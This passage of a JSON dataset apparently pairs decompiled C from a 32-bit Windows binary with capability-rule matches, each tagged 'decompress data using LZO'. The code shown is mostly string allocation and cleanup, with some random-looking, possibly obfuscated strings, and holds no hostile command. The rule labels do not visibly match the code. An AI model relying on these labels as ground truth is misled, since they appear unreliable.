fcn.004047f5();\ncode_r0x0042471a:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00424726:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x00424732:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x0042473e:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2621
    },
    "00405b19": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.00405b19(uint32_t param_1, uint param_2, int32_t param_3, uint param_4, uint param_5, uint32_t param_6, \n                      uint param_7, uint32_t param_8)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint *in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    uchar **ppuStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint32_t uStack68;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cd80;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (param_6 < 0x10) {\ncode_r0x00448183:\n        ppuStack32 = ppuVar1;\n        param_5 = 0;\n        param_6 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (in_stack_0000004c < 0x10) {\ncode_r0x004481c8:\n            *in_FS_OFFSET = piStack28;\n            return piStack28;\n        }\n        puStack72 = in_stack_00000038;\n        if ((in_stack_0000004c + 1 < 0x1000) ||\n           (puStack72 = in_stack_00000038[-1],  in_stack_00000038 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x004481c8;\n        }\n    }\n    else {\n        uStack68 = param_1;\n        if ((param_6 + 1 < 0x1000) ||\n           (uStack68 = *(param_1 - 4),  unaff_EDI = uStack68,  (param_1 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x00448183;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    ppuStack88 = &ppuStack88;\n    uStack76 = 0xffffffff;\n    uStack80 = 0x44cd90;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    ppuVar1 = &ppuStack88;\n    if (0xf < param_1) {\n        iVar2 = unaff_ESI;\n        if ((0xfff < param_1 + 1) && (iVar2 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar2)) {\n            uStack76 = 0;\n            fcn.004047f5();\n            goto code_r0x004482ee;\n        }\n        ppuStack88 = &ppuStack88;\n        fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack88;\n    }\n    ppuStack88 = ppuVar1;\n    param_1 = 0xf;\n    if (0xf < param_8) {\n        iVar2 = param_3;\n        if ((0xfff < param_8 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2)) {\ncode_r0x004482ee:\n            uStack76 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            return 0;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack84;\n    return 0x10cc6;\n}\n",
        "token_count": 1045
    },
    "0040242d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040242d(uchar *param_1)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar *unaff_retaddr;\n    uint32_t in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uchar *in_stack_0000001c;\n    uint in_stack_0000002c;\n    uint32_t in_stack_00000030;\n    uchar *in_stack_00000034;\n    uint32_t in_stack_00000048;\n    uint32_t in_stack_fffffee0;\n    uint uStack256;\n    uchar uStack252;\n    char *pcStack248;\n    int32_t iStack244;\n    uint uStack228;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    uint uStack204;\n    uint32_t uStack200;\n    int32_t iStack196;\n    uint uStack180;\n    uint32_t uStack176;\n    uchar uStack172;\n    uchar *puStack168;\n    int32_t iStack164;\n    uint uStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uchar *puStack148;\n    uchar *in_stack_ffffff94;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack68;\n    uchar auStack64 [4];\n    uchar *puStack60;\n    uchar *puStack56;\n    uchar *puStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ca70;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar4 = unaff_EDI;\n    puVar1 = &stack0xffffffe0;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x0043e797:\n        puStack32 = puVar1;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000030) {\n            puStack80 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (puStack80 = *(in_stack_0000001c + -4),  puVar4 = puStack80,  0x1f < in_stack_0000001c + (-4 - puStack80)\n               )) goto code_r0x0043e841;\n            uStack44 = 0x43e7d9;\n            fcn.00401a32(puStack80);\n        }\n        in_stack_0000002c = 0;\n        in_stack_00000030 = 0xf;\n        in_stack_0000001c = in_stack_0000001c & 0xffffff00;\n        if (in_stack_00000048 < 0x10) {\ncode_r0x0043e822:\n            *in_FS_OFFSET = iStack28;\n            return iStack28;\n        }\n        puStack84 = in_stack_00000034;\n        if ((in_stack_00000048 + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000034 + -4),  puStack80 = puVar4,  in_stack_00000034 + (-4 - puStack84) < 0x20)) {\n            uStack44 = 0x43e81f;\n            fcn.00401a32(puStack84);\n            goto code_r0x0043e822;\n        }\n    }\n    else {\n        puStack80 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (puStack80 = *(param_1 + -4),  puVar4 = puStack80,  param_1 + (-4 - puStack80) < 0x20)) {\n            uStack44 = 0x43e794;\n            puStack32 = &stack0xffffffe0;\n            fcn.00401a32(puStack80);\n            puVar1 = puStack32;\n            goto code_r0x0043e797;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0043e841:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    puStack48 = 0x43e86c;\n    fcn.004052d1();\n    puStack60 = 0x43e87c;\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack60 = &stack0x00000014;\n    fcn.004052d1();\n    puStack100 = &stack0xffffff9c;\n    puStack152 = &stack0xffffffc0;\n    iStack88 = 0xffffffff;\n    uStack92 = 0x44ca80;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puVar4 = puStack80;\n    puVar1 = &stack0xffffff9c;\n    if (&stack0xfffffffc < 0x10) {\ncode_r0x0043e8f8:\n        puStack100 = puVar1;\n        puStack56 = puStack56 & 0xffffff00;\n        if (0xf < unaff_EDI) {\n            puStack148 = puStack32;\n            if ((0xfff < unaff_EDI + 1) &&\n               (puStack148 = *(puStack32 + -4),  puVar4 = puStack148,  0x1f < puStack32 + (-4 - puStack148)))\n            goto code_r0x0043e9a8;\n            fcn.00401a32(puStack148);\n            in_stack_ffffff94 = puStack148;\n        }\n        puStack32 = puStack32 & 0xffffff00;\n        if (in_stack_00000014 < 0x10) {\ncode_r0x0043e984:\n            *in_FS_OFFSET = iStack96;\n            return 0x44e2;\n        }\n        puStack152 = unaff_retaddr;\n        if ((in_stack_00000014 + 1 < 0x1000) ||\n           (puStack152 = *(unaff_retaddr + -4),  puStack148 = puVar4,  unaff_retaddr + (-4 - puStack152) < 0x20)) {\n            fcn.00401a32(puStack152);\n            goto code_r0x0043e984;\n        }\n    }\n    else {\n        puStack148 = puStack56;\n        if ((&stack0xfffffffd < 0x1000) ||\n           (puStack148 = *(puStack56 + -4),  puVar4 = puStack148,  puStack56 + (-4 - puStack148) < 0x20)) {\n            puStack100 = &stack0xffffff9c;\n            fcn.00401a32(puStack148);\n            in_stack_ffffff94 = puStack148;\n            puVar1 = puStack100;\n            goto code_r0x0043e8f8;\n        }\n        iStack88 = 0;\n        fcn.004047f5();\ncode_r0x0043e9a8:\n        iStack88 = 1;\n        fcn.004047f5();\n    }\n    iStack88 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack168 = &stack0xffffff00;\n    uStack160 = 0x44ca90;\n    iStack164 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff5c;\n    uStack228 = 0;\n    uStack224 = 0xf;\n    iStack244 = 0;\n    uStack156 = 7;\n    uStack252 = iStack196;\n    pcStack248 = \"yudcvkwhijaknqvsaurzhomcwzdykytiiuakmcwrdpcgoftcdlosvekvtouwqjsj\";\n    uStack256 = 0x40;\n    fcn.00402f72();\n    uStack180 = 0;\n    uStack176 = 0xf;\n    iStack196 = 0;\n    uStack156 = 8;\n    fcn.00402f72(0x40, uStack220, \"yudcvkwhijaknqvsaurzhomcwzdykytiiuakmcwrdpcgoftcdlosvekvtouwqjsj\");\n    uStack204 = 0;\n    uStack200 = 0xf;\n    uStack220 = 0;\n    uStack156 = 10;\n    fcn.00402f72(0x40, uStack172, \"yudcvkwhijaknqvsaurzhomcwzdykytiiuakmcwrdpcgoftcdlosvekvtouwqjsj\");\n    if (uStack200 < 0x10) {\ncode_r0x0043eb1a:\n        if (0xf < uStack176) {\n            in_stack_fffffee0 = uStack176 + 1;\n            iVar2 = iStack196;\n            if (0xfff < in_stack_fffffee0) {\n                iVar2 = *(iStack196 + -4);\n                if (0x1f < (iStack196 + -4) - iVar2) goto code_r0x0043ed2e;\n                in_stack_fffffee0 = uStack176 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack180 = 0;\n        uStack176 = 0xf;\n        iStack196 = 0;\n        uStack156 = 8;\n        fcn.00402f72(0x40, in_stack_fffffee0 & 0xffffff00 | uStack220 & 0xff, \n                     \"yudcvkwhijaknqvsaurzhomcwzdykytiiuakmcwrdpcgoftcdlosvekvtouwqjsj\");\n        uStack204 = 0;\n        uStack200 = 0xf;\n        uStack220 = 0;\n        uStack156 = 9;\n        fcn.00402f72(0x40, uStack172, \"yudcvkwhijaknqvsaurzhomcwzdykytiiuakmcwrdpcgoftcdlosvekvtouwqjsj\");\n        if (0xf < uStack200) {\n            uVar3 = uStack220;\n            if ((0xfff < uStack200 + 1) && (uVar3 = *(uStack220 - 4),  0x1f < (uStack220 - 4) - uVar3))\n            goto code_r0x0043ed3a;\n            fcn.00401a32(uVar3);\n        }\n        if (0xf < uStack176) {\n            iVar2 = iStack196;\n            if ((0xfff < uStack176 + 1) && (iVar2 = *(iStack196 + -4),  0x1f < (iStack196 + -4) - iVar2))\n            goto code_r0x0043ed46;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack224) {\n            iVar2 = iStack244;\n            if ((0xfff < uStack224 + 1) && (iVar2 = *(iStack244 + -4),  0x1f < (iStack244 + -4) - iVar2))\n            goto code_r0x0043ed52;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_ffffff94) {\n            puVar4 = &stack0xffffffd0;\n            if ((0xfff < in_stack_ffffff94 + 1) && (puVar4 = puStack52,  0x1f < &stack0xffffffcc + -puStack52))\n            goto code_r0x0043ed5e;\n            fcn.00401a32(puVar4);\n        }\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x0043ed6a;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = iStack164;\n        return 1;\n    }\n    in_stack_fffffee0 = uStack200 + 1;\n    uVar3 = uStack220;\n    if (in_stack_fffffee0 < 0x1000) {\ncode_r0x0043eb0e:\n        fcn.00401a32(uVar3);\n        goto code_r0x0043eb1a;\n    }\n    uVar3 = *(uStack220 - 4);\n    if ((uStack220 - 4) - uVar3 < 0x20) {\n        in_stack_fffffee0 = uStack200 + 0x24;\n        goto code_r0x0043eb0e;\n    }\n    uStack156 = 0;\n    fcn.004047f5();\ncode_r0x0043ed2e:\n    uStack156 = 1;\n    fcn.004047f5();\ncode_r0x0043ed3a:\n    uStack156 = 2;\n    fcn.004047f5();\ncode_r0x0043ed46:\n    uStack156 = 3;\n    fcn.004047f5();\ncode_r0x0043ed52:\n    uStack156 = 4;\n    fcn.004047f5();\ncode_r0x0043ed5e:\n    uStack156 = 5;\n    fcn.004047f5();\ncode_r0x0043ed6a:\n    uStack156 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 3392
    },
    "0040141a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0040141a(uint param_1, uint32_t param_2)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t *arg_8h;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint in_stack_00000018;\n    uint32_t in_stack_0000001c;\n    uchar *in_stack_00000030;\n    uint32_t in_stack_00000044;\n    uint uStack200;\n    uchar uStack196;\n    char *pcStack192;\n    uint uStack188;\n    ushort uStack184;\n    uint uStack172;\n    uint uStack168;\n    int32_t iStack164;\n    uint uStack148;\n    uint32_t uStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ca10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x0043db24:\n        ppuStack32 = ppuVar1;\n        in_stack_00000018 = 0;\n        in_stack_0000001c = 0xf;\n        param_2 = param_2 & 0xffffff00;\n        if (in_stack_00000044 < 0x10) {\ncode_r0x0043db6a:\n            *in_FS_OFFSET = piStack28;\n            return *0x542744;\n        }\n        puStack72 = in_stack_00000030;\n        if ((in_stack_00000044 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_00000030 + -4),  in_stack_00000030 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x0043db6a;\n        }\n    }\n    else {\n        uStack68 = param_2;\n        if ((in_stack_0000001c + 1 < 0x1000) ||\n           (uStack68 = *(param_2 - 4),  unaff_EDI = uStack68,  (param_2 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x0043db24;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack200;\n    uStack80 = 0x44ca20;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack168 = 0xf;\n    uStack172 = 5;\n    uStack188 = 0x65717a6d;\n    uStack184 = 0x62;\n    uStack148 = 0;\n    uStack144 = 0xf;\n    iStack164 = 0;\n    uStack76 = 4;\n    uStack196 = iStack116;\n    pcStack192 = \"tqiuqerkiipkvqufypafuvavhdryzeykqcezkyqy\";\n    uStack200 = 0x28;\n    fcn.00402f72();\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 5;\n    fcn.00402f72(0x28, iStack140, \"tqiuqerkiipkvqufypafuvavhdryzeykqcezkyqy\");\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack76 = 6;\n    fcn.00402f72(0x28, uStack92, \"tqiuqerkiipkvqufypafuvavhdryzeykqcezkyqy\");\n    if (uStack120 < 0x10) {\ncode_r0x0043dd08:\n        if (0xf < uStack96) {\n            iVar2 = iStack116;\n            if ((0xfff < uStack96 + 1) && (iVar2 = *(iStack116 + -4),  0x1f < (iStack116 + -4) - iVar2))\n            goto code_r0x0043dddf;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack144) {\n            iVar2 = iStack164;\n            if ((0xfff < uStack144 + 1) && (iVar2 = *(iStack164 + -4),  0x1f < (iStack164 + -4) - iVar2))\n            goto code_r0x0043ddeb;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < unaff_EBX) {\n            arg_8h = piStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = piStack28[-1],  0x1f < piStack28 + (-4 - arg_8h)))\n            goto code_r0x0043ddf7;\n            fcn.00401a32(arg_8h);\n        }\n        *in_FS_OFFSET = piStack84;\n        return *0x542748;\n    }\n    iVar2 = iStack140;\n    if ((uStack120 + 1 < 0x1000) || (iVar2 = *(iStack140 + -4),  (iStack140 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043dd08;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x0043dddf:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x0043ddeb:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x0043ddf7:\n    uStack76 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1695
    },
    "00401429": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401429(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    int32_t aiStack108 [4];\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack108;\n    uStack24 = 0x44c990;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    aiStack108[0] = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x46);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x46, iStack84, \"kpjqbkzsnausgurquzbavydxpuswhneunsqrtdzpclfjrfikixsncvpemmsdkmroeasubh\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x46, uStack36, \"kpjqbkzsnausgurquzbavydxpuswhneunsqrtdzpclfjrfikixsncvpemmsdkmroeasubh\");\n    if (uStack64 < 0x10) {\ncode_r0x0043bf6b:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043c0c4;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = aiStack108[0];\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(aiStack108[0] + -4),  0x1f < (aiStack108[0] + -4) - iVar1))\n            goto code_r0x0043c0d0;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0043c0dc;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0043c0e8;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar1 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar1 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar1)) goto code_r0x0043c0f4;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043bf6b;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043c0c4:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043c0d0:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043c0dc:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043c0e8:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0043c0f4:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1279
    },
    "0040142e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040142e(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint auStack100 [2];\n    char *pcStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack100;\n    uStack24 = 0x44c9a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 3;\n    pcStack92 = \"ofzcfvfomzoshoixgwjkoav\";\n    auStack100[0] = 0x17;\n    fcn.00402f72();\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x1f, uStack36, \"ydsoswxagnqyvyofdrkvxbxknuezukz\");\n    puStack40[5] = 0xf;\n    puStack40[4] = 5;\n    *puStack40 = 0x6871616d;\n    *(puStack40 + 1) = 0x71;\n    if (uStack44 < 0x10) {\ncode_r0x0043c2dc:\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x0043c36f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x0043c37b;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack64;\n    if ((uStack44 + 1 < 0x1000) || (iVar2 = *(iStack64 + -4),  (iStack64 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043c2dc;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043c36f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043c37b:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 840
    },
    "0040149c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040149c(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000044;\n    int32_t aiStack84 [4];\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack84;\n    uStack24 = 0x44c620;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    aiStack84[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x25);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x5e, uStack36, \n                 \"jckgeptvgfcghwokdjsrykgcsjfgwfhrpffpgsvrfnrmownvbfwmzoazdqijbzcparhjjntuaapguhewvhdrbwknisedyt\");\n    if (uStack40 < 0x10) {\ncode_r0x00432277:\n        if (0xf < uStack64) {\n            iVar2 = aiStack84[0];\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(aiStack84[0] + -4),  0x1f < (aiStack84[0] + -4) - iVar2))\n            goto code_r0x00432355;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00432361;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000044) {\n            iVar2 = in_stack_00000030;\n            if ((0xfff < in_stack_00000044 + 1) &&\n               (iVar2 = *(in_stack_00000030 + -4),  0x1f < (in_stack_00000030 + -4) - iVar2)) goto code_r0x0043236d;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00432277;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00432355:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00432361:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043236d:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 920
    },
    "00403e72": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
